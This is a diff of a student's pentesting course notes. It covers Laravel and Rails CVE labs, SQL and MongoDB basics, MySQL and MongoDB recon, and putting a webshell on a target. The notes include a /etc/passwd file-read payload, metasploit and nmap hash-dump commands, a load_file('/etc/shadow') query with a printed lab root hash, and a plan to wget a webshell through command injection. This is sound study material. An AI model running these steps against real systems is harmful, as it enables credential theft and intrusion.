@@ -263,7 +263,6 @@ Socket addr is combination of the ip addr and the socket being used.
 
 
 
-tldrs for man pages: https://tldr.sh/
 
 #### [http vs https](https://seopressor.com/blog/http-vs-https/) and [why http is not secure](https://www.cloudflare.com/learning/ssl/why-is-http-not-secure/) and [more on http/3 with QUIC protocol](https://medium.com/devgorilla/what-is-http-3-94335c57823f)
 
@@ -311,11 +310,50 @@ Ppl do this because getting issued an SSL cert requires money (like a license) C
 
 
 
+## week 1 Lab: laravel unserialize
+
+Aim: use the [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) exploit for the laravel framework.
+
+0. understanding the exploit by reading the [laravel documentation on the exploit](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30):
+      - when the APP_KEY (an encryption key?) env variable is with a malicious party. If an attacker has the APP_KEY, they can create malicious payload and encrypt it with the APP_KEY Sending the encrypted payload in the X-XSRF-TOKEN token will result in deserialization, which during processing will result in Remote Code execution.
+1. recon the target: 
+    * we know that the port 8000 (for tcp/udp connections?) is left open and we have a known mac address for the target IP.
+    * info about the webapp framework being used, do a curl request on that open port 
+      QQ: the lab guide says that we do a curl request and then know that the framework being used is laravel because of the title of the html doc, but there shouldn't be any link b/w the title of the webapp and the framework used, right? instead, we should maybe look at the verbose output for that curl comd, which says that the cookie set is a laravel_session..
+
+
+
+## week 1 Lab: rails doubletap RCE 
+
+Aim: two vulnerabilities to the Rails framework are known, we have to exploit those 
+
+0. understanding the exploits by reading the mitre links, which have advisory pages from other sites about the vulnerability
+   - CVE-2019-5418: According to the [Google Group discussion](https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q), A specifically crafted header can result in arbitrary file read. 
+   - see the [blog post](https://chybeta.github.io/2019/03/16/Analysis-for【CVE-2019-5418】File-Content-Disclosure-on-Rails/) to understand how the exploit works. something like :
+      `/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}` will make the  /etc/passwd will be treated the template to be rended ，which lead to a arbitrary file read attack.
+
+1. network scan on target ip to find open ports and see what services are running...
+    - nmap tells us that the port 3000 is open and running it w -sC and -sV tells us that the webapp runs on Rails
+    - we can do a curl command on the target ip and get the version of rails that is being run. here it's Rails 5.2.1, 
+    - next we look for relevant end points using dirb, we see that `/test` is worth looking into
+
+2. now for the other vulnerability CVE-2019-5420
+   - we can bruteforce the Key used to encrypt the session since it depends on the name of the application. 
+   - with the key we sent a serialized payload to the endpoint, which when decrypted and deserialized will give RCE
+
+  for this just use the relevant metasploit script...
+
+
+
+***takeaways:***
+
+1. exploits can be composited together!
 
 
 
 
-# Current Reading List: 
+
+
 
 webapp vs website: https://www.guru99.com/difference-web-application-website.html
 
@@ -323,29 +361,330 @@ using telnet to send http request?? aren't they diff protocols though  https://w
 
 more on IP addrs and subnets, representation in CIDR(classless inter domain routing) https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing
 
-google dorking and db hacking: 
-https://securitytrails.com/blog/google-hacking-techniques
-https://www.exploit-db.com/google-hacking-database
-https://www.shodan.io/
 
-
-burp downloads: https://portswigger.net/burp/releases/professional-community-2020-4
-
-
-metasploit: https://www.youtube.com/watch?v=8lR27r8Y_ik
-
-
-
-
-
-# Day 2: database
 
 
 - nmap's mongodb-brute script uses a default dictionary (it's a hybrid of )
 
 
-Reading list: 
+[google dorking and db hacking](https://securitytrails.com/blog/google-hacking-techniques)
+
+- webcrawling by search engines done by bots. there's a protocol that dictates that all robots need to look at the [robots.txt file](https://www.seobility.net/en/wiki/Robots.txt?utm_source=google&utm_medium=cpc&utm_campaign=wiki_en&utm_term={robots%20txt}&utm_content=lp_robots.txt&gclid=EAIaIQobChMIu4uIhdi_6QIVmh0rCh3yBgZCEAAYASAAEgLXSvD_BwE) before doing anything else this file restricts what can be crawled.
+- whoa this is really cool 
+
+
+[what a webshell is](https://malware.expert/general/what-is-a-web-shell/)
+
+- written based on what lang/framework is used for the website. acts as a backdoor.
+- allows attacker to do CRUD actions on the website
+- ways of getting infected: by open documents/file upload endpoints, XSS and exposed admin interfaces
+  
+
+[portknocking](https://wiki.archlinux.org/index.php/Port_knocking)
+
+- externally opening up ports that were originally closed by default by the firewall. 
+- done by "knocking" (attempting to connect to) the correct ports in a special sequence.
+
+[the diff interfacs when you do an ip addr](https://www.computerhope.com/unix/uifconfi.htm)
+Linux command to view network interfaces on your machines
+(equivalent of deprecated Linux command - ifconfig)
+
+    • Eth0 – network interface that the system uses to access lab
+    • Eth1 – network interface that the system uses to communicate with others
+    • Lo - special network interface that the system uses to communicate with itself.
+
+
+[single page apps](https://dzone.com/articles/what-is-a-single-page-application), [why SPAs are useful](https://huspi.com/blog-open/definitive-guide-to-spa-why-do-we-need-single-page-applications) and [more common SPA frameworks](https://hackr.io/blog/best-javascript-frameworks)
+
+- single page apps get updated via AJAX requests or via [websockets](https://en.wikipedia.org/wiki/WebSocket)
+    - Websockets is another protocol distinct from http, communication done via port 80 or 443(for secure comms)
+    - AJAX:  By decoupling the data interchange layer from the presentation layer, Ajax allows web pages and, by extension, web applications, to change content dynamically without the need to reload the entire page
+
+[monolithic/multi-tiered vs microservices applications](https://dzone.com/articles/monolithic-vs-microservice-architecture)
+- the browser was the (only?) client and there were no exposed APIs.
+- ***API related: SOAP vs REST api (there's also GraphQL)***: [source 1](https://smartbear.com/blog/test-and-monitor/soap-vs-rest-whats-the-difference/) and [source 2 on SOAP vs REST {much better article}](https://raygun.com/blog/soap-vs-rest-vs-json/)
+    - SOAP (Simple Object Access Protocol) is more rigid and standardised. Relies exclusively on XML
+        - the xml can be complex, requests might have to be built manually
+        - something about WSDL (Web Services Description Language) that allows IDEs to automate the XML request creation....
+        - SOAP has built in error-handling (makes it rigid too)
+        - SOAP can be used over SMTP (and other transport protocols) also, not just restricted to HTTP
+    - REST (Representational State Transfer): relies on simple URLs, is associated with HTTP1.1 Verbs
+        - not necessarily have to use XML, can use CSV, JSON and RSS as well. The idea is to obtain the info needed in a form that's easily parsed using the language needed for the application.
+    - Similarities: 
+        - both work over HTTP, both have well established rules on how to exchange information
+    - Differences: 
+        - why SOAP: 
+            - not restricted to just HTTP
+            - useful in a distributed situation while REST is more direct point to point.
+            - built in error handling and standardised
+        - why REST: 
+            - can be more efficient as can use smaller message formats
+            - Fast, little processing required 
+  - **NB**: JSON is language agnostic!
+- so yea a good analogy is the elephant (monolithic application) vs ants (application made up of many microservices)
+
+- [microservices example of a cinema with microservices and using docker](https://dzone.com/articles/microservices-an-example-with-docker-go-and-mongod)
+
+
+[containerisation and benefits, also where Docker and Kubernetes come into the picture](https://www.forbes.com/sites/forbestechcouncil/2018/10/10/docker-and-kubernetes-furthering-the-goals-of-devops-automation/#1ccc436f6506)
+  * application ends up being self-sufficient, application is packaged into self-contained bundles (bundle/container has the app, dependencies, libs and configs all bundles together) [more on containerisation basics](https://www.forbes.com/sites/forbestechcouncil/2018/05/31/what-containers-do-and-how-they-can-make-or-break-your-business/#5e7127164079)
+  * containers can be physical or cloud-based.
+  * they have to be made to be stateful, e.g. by relying on some underlying db 
+  * Docker and kubernetes are common containerisation technologies. 
+    * Docker is hardware-agnostic 
+    * It’s helpful to have an orchestration layer that manages resources, scheduling, load balancing and more.
+    * trend now: Docker is what helps development create containers, and Kubernetes is what operations uses to orchestrate and manage them. 
+
+[different api gateway architectures one can use](https://microservices.io/patterns/apigateway.html)
+
+[serverless architectures](https://www.twilio.com/docs/glossary/what-is-serverless-architecture)
+- Functions as a service, you're just writing the functions, letting a third party handle the backend, with a little config for which you're responsible for
+
+[the different serverless architectural patterns possible](https://www.serverless.com/blog/serverless-architecture-code-patterns/)
+[saas-vs-paas-vs-iaas](https://www.bmc.com/blogs/saas-vs-paas-vs-iaas-whats-the-difference-and-how-to-choose/)
+
+
+
+# Day 2: databases in webapps
+
+## week 2 lab: SQL basics
+
+overview: 
+  * SELECT, INSERT, CREATE, UPDATE statements
+  * AS, DISTINCT, WHERE ORDER BY and Limit clauses
+  * LIKE, AND and OR operators
+  * COUNT aggregation.
+
+* table definitions are v useful when reading raw code for the table, but other db visualising tools are much more intuitive.
+* ***viewing things and navigation***: 
+    * db has properties and a db schema, each table in the db will have a table definition and that gives a good overview
+    * to see all dbs in the system, `show databases;` will do that 
+    * select a particular db using `use <db name> ;`
+    * see tables in a db using `show tables;` 
+        * wildcard queries on a table: `select * from <tableName>;`
+        * query specific table columns: `seelct <colName1>,<colName2> from <tableName>;`
+        * retrieve data from table via dot operators: `select * from <dbName>.<tableName>`
+        * **sorting** using `select * from <dbName>.<tableName> order by <columnName>`
+        * **upper bound limiting** using `limit <number>`
+        * **strict limiting** using `limit <upper>,<number of rows?>` <--- i think can only use for specific row number, not exactly for ranges ??
+* ***table creation***
+    * ```sql
+      create table new_users(
+          name varchar(100),
+          email varchar(100),
+          id varchar(100),
+          primary key(id)
+      )
+      ```
+* ***row insertion into a table followed by subsequent updating of that table***
+  * ```sql
+      insert into wpdatabase.new_users values ("John", "john@email.com", "pa-01234");
+      update wpdatabase.new_users set name="james" where id="pa-01234";
+    ```
+* ***UNION SELECT statement to combine two tables***  note that the two tables need to have equal number of columns seelcted from each table
+    1. first have to check the tables: `desc from wpdatabase.wp_users` 
+    2. after choosing the correct columns and col names, do a union **this doesn't make a new table i think, just presents the data as a new table**
+      `select user_login,user_email from wpdatabase.wp_users union select name,email from wpdatabase.new_users;`
+   
+* ***JOIN*** statement to combine rows from two tables:
+    * ```sql
+      select
+      from wpdatabase.wp_users
+      JOIN wpdatabase.new_users on wpdatabase.new_users.name=wpdatabase.wp_users.user_login
+
+      <!-- Using the join statement, display the value in user_login and user_pass field from the table wp_users and display the id from new_users table. -->
+      select wpdatabase.wp_users.user_login,wpdatabase.wp_users.user_pass, wpdatabase.new_users.id
+      from wpdatabase.wp_users 
+      JOIN wpdatabase.new_users on wpdatabase.new_users.name=wpdatabase.wp_users.user_login
+
+      ```
+
+    select statement shall select all necessary columns regardless of which table
+    seems like the `JOIN <first table> on <first table's last col to join at = <second table's first col to start from>>`
+* using ***aliases!*** as part of your select statement
+    ```sql
+    select user_login as name, user_pass as password from wpdatabase.wp_users;
+    ```
+
+* identifying unique col values:
+    ```sql
+    select distinct(post_author) from wpdatabase.wp_posts;
+    ```
+* ***counting***
+    ```sql
+    select count(*) from wpdatabase.wp_posts;
+    ```
+* ***select and filter via entry value*** using **WHERE**
+    ```sql
+    select * from wpdatabase.wp_posts where post_status='publish';
+    ```
+    note: can just add conditions using `and` 
+* ***setting clauses*** using **like**
+    ```sql
+    select * from wpdatabase.wp_posts where post_content like '%wp:paragraph%'; 
+    <!-- like takes in a html string -->
+    ```
+## week 2 lab: NoSQL basics: 
+
+Assuming you have access to a server that has a mongo db without any access restrictions. connect to the mongo shell via `mongo <target ip>`
+
+* diff b/w user dbs and server's other dbs: The databases "admin","config" and "local" are used by MongoDB itself.
+* list out collections of documents via `show collections` 
+* identifying number of documents in the database: Query Syntax: ​`db.<collection-name>.find().count()`
+* adding arguments to the `find()` method almost like a json style... e.g. `db.city.find({"state":"MA"}).count()`
+* adding equality arguments as nested attributes: `db.city.find({"pop":{$gt:15000}}).count()`
+* nesting things with an and operator: `db.city.find({$and:[{pop:{$gt:15000}},{"state":"IN"}]}).count()`
+* or operator and multiple conditions: `db.city.find({$or:[{pop:{$lt:100}},{"state":"IN"}]}).count()`
+* using regex 
+* using aggregation
 - more on webshells: https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/
-- hashcat, john the ripper,mdk <---some tools: 
+
 - https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/connection-control-installation.html  <-- setting limits on number of queries in a db
-- 
+
+
+## week 2 lab: mysql recon basics
+
+session's target ip: 192.252.231.3
+we use both metasploit and nmap scripts for the same db recons... 
+some info we can get by just using the mysql console! e.g. loading readable files...
+
+
+1. What is the version of MySQL server?
+    * 5.5.62-0ubuntu0.14.04.1 
+  
+2. What command is used to connect to remote MySQL database?
+    * `mysql -h <hostip> - u root` connects as root user
+  
+3. How many databases are present on the database server? 11 of them 
+  
+4. How many records are present in table “authors”? This table is present inside the “books” database.
+    * use the `books` db, then `select count(*) from books.authors`
+
+5. Dump the schema of all databases from the server using suitable metasploit module?
+    * find the metasploit module: `use auxiliary/scanner/mysql/mysql_schemadump`
+    * set the relevant options (RHOSTS, USERNAME, PASSWORD) and exploit
+  
+6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
+   2, /tmp and /root
+
+   use ***mysql_writable_dirs***
+
+    ```
+    use auxiliary/scanner/mysql/mysql_writable_dirs
+    set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+    set RHOSTS 192.71.145.3
+    set VERBOSE false
+    set PASSWORD ""
+    exploit
+    ```
+    manually look for writable dirs 
+
+7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
+    use ***mysql_file_enum*** and the wordlist at `/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt`
+
+8. Find the system password hash for user "root".
+    * since we know that the shadow file is present and readable, we enter the db as root and load the shadow file like so: `select load_file("/etc/shadow");`
+    * the relevant part is: `root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::` the password is  `S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`
+9. How many database users are present on the database server? Lists their names and password hashes.
+    * `use auxiliary/scanner/mysql/mysql_hashdump` , set the required options and exploit 
+    * this will return other usernames and the hashed versions of their passwords 
+
+
+
+**NB: for nmap script arguments, doublecheck what the key should be , it's not always user or sql-user or username...**
+
+10. Check whether anonymous login is allowed on MySQL Server.
+    * use nmap's relevant script `nmap --script=mysql-empty-password -p 3306 192.252.231.3`
+11. Check whether “InteractiveClient” capability is supported on the MySQL server.
+    * use `nmap --script=mysql-info -p 3306 192.252.231.3`
+12  Enumerate the users present on MySQL database server using mysql-users nmap script. ***note: this is for enumeration only***
+    * ` nmap --script=mysql-users --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.252.231.3`
+13. List all databases stored on the MySQL Server using nmap script.
+    * `nmap --script=mysql-databases --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.252.231.3`
+14. Find the data directory used by mysql server using nmap script.
+    * `nmap --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.252.231.3` and look for the `datadir` field
+15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
+    * `nmap --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.252.231.3`
+16. Dump all user hashes using  nmap script. revers to sql user not system users of that server
+    * `nmap --script=mysql-dump-hashes --script-args="username='root', password=''" -p 3306 192.252.231.3`
+17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
+  
+***flag:*** note that system password hash (get it from /etc/shadow) and the mySQL hashing of mySQL user passwords are two completely diff things
+
+
+## week2: mongodb recon basics
+
+background: 
+- target ip was `192.221.117.3` 
+
+1. find version of mongoDB used
+    * via a normal nmap services scan. `nmap-sV -p- <targetip>` **nb:** have to scan all ports since mongodb's is non-standard
+      ans: 27017/tcp open  mongodb MongoDB 3.6.3
+
+    * via mongo clients (trying to use mongo shell consoles): `mongo <target>`. ans: `MongoDB server version: 3.6.3`
+2. since it's an unstructured db (No-SQL) we wanna know how many documents are inserted into this db: 
+    * [using this nmap script](https://nmap.org/nsedoc/scripts/mongodb-info.html) we run `**nmap -p 27017 --script mongodb-info 192.195.41.3 | grep -A5 -B5 document**`
+    * note the grep piping. the A and B flags refer to how many lines before and after the grep you wana print out 
+    * ans: 29353
+3. now we list the names of the dbs stored on the mongoDB server via nmap script ` nmap -p 27017 --script mongodb-databases 192.221.117.3   `
+4. we can do the step 3 using the mongo client. we enter he console of the target server and: 
+    * `mongo<target>`
+    * `show dbs`
+5. now on, we use the mongo client, we can list collections in a db by doing: 
+    * `use <dbname>`
+    * `show collections` 
+6. and count the number of documents in a collection once using a db: `db.city.find().count()`
+
+
+## wee2: from web to shell on the server 
+
+in a kali install, look at `/usr/share/webshells/` for available webshells 
+the aim is to take one of these webshells, open up sharing via simple http servers of some sort, then from within the compromised target (command injection vulnerability) in which we can execute commands, download the webshell from the attacker machine via wget. 
+assumptions: root dir is somehow writeable  (maybe after escalation of privileges..)
+we could do stuff like looking at config/ini files and getting root credentials for whatever db being used, and thereby making db queries
+
+
+finally we just run the webshell!
+
+
+[**about shadow files**](https://linuxize.com/post/etc-shadow-file/):
+
+Shadow files are used in one of the various authentication schemes in linux, check against the `/etc/shadow` or `/etc/passwd` files. shadow file is a text file and it contains system users' pwds, owned by root.
+there's a shadow format: 
+  ```
+  mark:$6$.n.:17736:0:99999:7:::
+  [--] [----] [---] - [---] ----
+  |      |      |   |   |   |||+-----------> 9. Unused
+  |      |      |   |   |   ||+------------> 8. Expiration date
+  |      |      |   |   |   |+-------------> 7. Inactivity period
+  |      |      |   |   |   +--------------> 6. Warning period
+  |      |      |   |   +------------------> 5. Maximum password age
+  |      |      |   +----------------------> 4. Minimum password age
+  |      |      +--------------------------> 3. Last password change
+  |      +---------------------------------> 2. Encrypted Password
+  +----------------------------------------> 1. Username
+  ```
+
+  The encrypted password field has the format: `$type$salt$hashed format`
+  common types of encryption: `$1$` – MD5  `$2a$` – Blowfish  `$2y$` – Eksblowfish  `$5$` – SHA-256   `$6$` – SHA-512
+
+
+# Useful References
+* [tldrs for man pages](https://tldr.sh/)
+* [pentesteracademy relevant webapp pentesting labs](https://www.attackdefense.com/listing?labtype=pa-web-app-pentesting&subtype=pa-web-app-pentesting-video-labs)
+* [google dorking methods](https://securitytrails.com/blog/google-hacking-techniques) and [a database for google dorks](https://www.exploit-db.com/google-hacking-database)
+* [shodan search engine](https://www.shodan.io/)
+* [burpsuite downloads](https://portswigger.net/burp/releases/professional-community-2020-4)
+* hashcat, john the ripper,mdk <---some tools: 
+* - hydra :
+  https://tools.kali.org/password-attacks/hydra
+  https://sectools.org/tag/pass-audit/
+* [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
+* 
+
+
+# todos and toreads
+
+* also,read up on shadow files and how passwords are stored in the unix filesystems.
+* [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
+* 
